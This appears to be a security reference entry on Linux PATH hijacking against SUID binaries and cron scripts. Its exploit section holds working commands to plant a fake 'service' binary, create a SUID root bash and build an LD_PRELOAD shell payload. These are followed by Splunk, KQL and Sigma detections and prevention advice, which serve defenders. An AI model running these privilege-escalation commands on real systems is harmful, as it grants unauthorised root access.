name: PATH Hijacking - Exploit Relative Paths in SUID/Cron Scripts
description: PATH hijacking exploits scripts or SUID binaries that call system commands without full paths. If the script runs 'service apache restart' instead of '/usr/sbin/service apache restart', you can create a malicious 'service' binary in a directory earlier in PATH and it runs with the script's privileges.
notes:
=== FIND TARGETS ===
  # SUID binaries using relative paths
  find / -perm -4000 -type f 2>/dev/null
  # For each SUID binary, check what commands it calls:
  strings /usr/local/bin/suid-binary | grep -E '^[a-z]'
  ltrace /usr/local/bin/suid-binary 2>&1 | grep system
  strace /usr/local/bin/suid-binary 2>&1 | grep exec

  # Cron scripts using relative paths
  cat /etc/crontab
  ls /etc/cron.d/
  # Look for scripts calling commands without full path

=== EXPLOIT ===
  # If SUID binary calls 'service' without full path:
  echo '#!/bin/bash' > /tmp/service
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
  chmod +x /tmp/service
  export PATH=/tmp:$PATH
  /usr/local/bin/suid-binary
  /tmp/rootbash -p  # root shell

=== COMMON RELATIVE COMMANDS ===
  service, curl, wget, python, php, cat, id, whoami, ifconfig, ip
  # Any of these without a / prefix are exploitable

=== ALSO CHECK ===
  # Shared libraries (LD_PRELOAD/LD_LIBRARY_PATH)
  # If SUID binary has env_keep for LD_PRELOAD:
  echo '#include <stdio.h>\nvoid _init() { setuid(0); system("/bin/bash -p"); }' > /tmp/pe.c
  gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
  sudo LD_PRELOAD=/tmp/pe.so /usr/local/bin/suid-binary

examples.label: Create malicious binary and hijack PATH
examples.command:
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH

examples.label: Find SUID binaries with relative paths
Check what commands a SUID binary calls

defense.why_it_works: When a binary calls system('service restart') without a full path, the OS searches $PATH directories in order. Prepending a writable directory with a malicious 'service' makes it execute first.
defense.prerequisites: SUID binary or privileged cron script using relative command paths; writable directory.
defense.impact: Privilege escalation to the owner of the SUID binary or cron job (often root).
defense.detection: [MITRE T1574.007] SUID binary executing unexpected child processes; PATH modifications in audit logs.
defense.artifacts: Process creation from SUID binary with unexpected child; modified PATH in environment.
defense.splunk_spl:
index=linux sourcetype=linux:audit type=EXECVE
| where match(a0, "/tmp/|/dev/shm/|/var/tmp/")
| table _time, uid, euid, exe, a0, a1
defense.sentinel_kql:
Syslog
| where SyslogMessage contains "EXECVE" and (SyslogMessage contains "/tmp/" or SyslogMessage contains "/dev/shm/")
| project TimeGenerated, Computer, SyslogMessage
defense.prevention: Always use full paths in scripts; remove unnecessary SUID bits; use secure_path in sudoers; mount /tmp with noexec.

detections.name: SUID binary executing from writable directory
detections.logic:
title: SUID Binary Child Process from Writable Directory
status: experimental
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: EXECVE
    a0|startswith:
      - '/tmp/'
      - '/dev/shm/'
      - '/var/tmp/'
  condition: selection
level: high
detections.tuning: Correlate with parent process being SUID; filter known good processes
